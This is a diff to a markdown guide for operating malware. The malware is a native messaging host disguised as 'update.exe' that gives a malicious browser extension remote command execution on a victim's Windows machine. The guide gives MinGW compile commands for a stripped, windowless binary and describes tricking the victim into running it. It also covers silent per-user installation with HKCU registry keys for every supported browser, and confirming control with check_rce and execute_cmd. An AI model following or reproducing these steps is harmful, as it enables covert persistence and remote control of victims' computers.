@@ -7,27 +7,13 @@ Compile it once locally, host the binary, then drop it with `execute_file`.
 
 ## 1. Compile (Windows host)
 
+One command — **no browser flag**. The host registers itself under **all
+supported browsers** (Chrome, Edge, Brave, Vivaldi) at install time, so the same
+binary works regardless of the target browser.
+
 ```bash
-# Edge (default — no flag)
 x86_64-w64-mingw32-gcc -O2 -s -static -mwindows -o update.exe native-host.c
-
-# Chrome
-x86_64-w64-mingw32-gcc -O2 -s -static -mwindows -DCHROME -o update.exe native-host.c
-
-# Vivaldi
-x86_64-w64-mingw32-gcc -O2 -s -static -mwindows -DVIVALDI -o update.exe native-host.c
-
-# Brave
-x86_64-w64-mingw32-gcc -O2 -s -static -mwindows -DBRAVE -o update.exe native-host.c
-
-# Chromium
-x86_64-w64-mingw32-gcc -O2 -s -static -mwindows -DCHROMIUM -o update.exe native-host.c
 ```
-
-> ⚠️ Do **not** use `-DBROWSER=edge` / `-DBROWSER=chrome` / `-DBROWSER=vivaldi`.
-> That defines a string macro the source never tests — it silently compiles an
-> **Edge** host regardless of the value, so `check_rce` reports
-> `Specified native messaging host not found` on every other browser.
 
 Result: a ~46 KB standalone `update.exe`, no dependencies. Install MinGW with
 `sudo dnf install mingw64-gcc` (Fedora) or `sudo apt install gcc-mingw-w64-x86-64`
@@ -39,8 +25,8 @@ Result: a ~46 KB standalone `update.exe`, no dependencies. Install MinGW with
 2. `execute_file <url_to_update.exe>` — the victim clicks the notification and
    the binary runs.
 3. The binary is **dual-mode**: on first run it installs itself
-   (`%LOCALAPPDATA%\Config\update.exe` + `manifest.json` + an `HKCU` registry key),
-   then exits. No admin rights required.
+   (`%LOCALAPPDATA%\Config\update.exe` + `manifest.json` + `HKCU` registry keys,
+   one per supported browser), then exits. No admin rights required.
 4. Restart the browser so it re-reads the registry (the host is only discovered
    at browser startup).
 5. `check_rce` to confirm, then `execute_cmd whoami`.
@@ -60,11 +46,10 @@ with a 60 s timeout. Message size is capped at 1 MB (Chrome's limit).
 
 ## 4. Notes
 
-- The host discovers extension IDs at install time (both packed and unpacked) so
-  `allowed_origins` matches the real agent ID — Chrome rejects wildcards.
+- The host discovers extension IDs at install time (both packed and unpacked,
+  across all supported browsers) so `allowed_origins` matches the real agent ID —
+  Chrome rejects wildcards.
 - `allowed_origins` uses `chrome-extension://<32-char-id>/`.
 - If `check_rce` reports `rce_active: false`, the host is not installed or the
-  browser has not been restarted since installation. The most common cause is
-  compiling with the wrong (or no) browser flag: the host then registers under a
-  different browser's `HKCU\Software\...\NativeMessagingHosts` key, and the
-  target browser reports `Specified native messaging host not found`.
+  browser has not been restarted since installation. Re-run `update.exe` to
+  (re)install the host, then restart the browser.
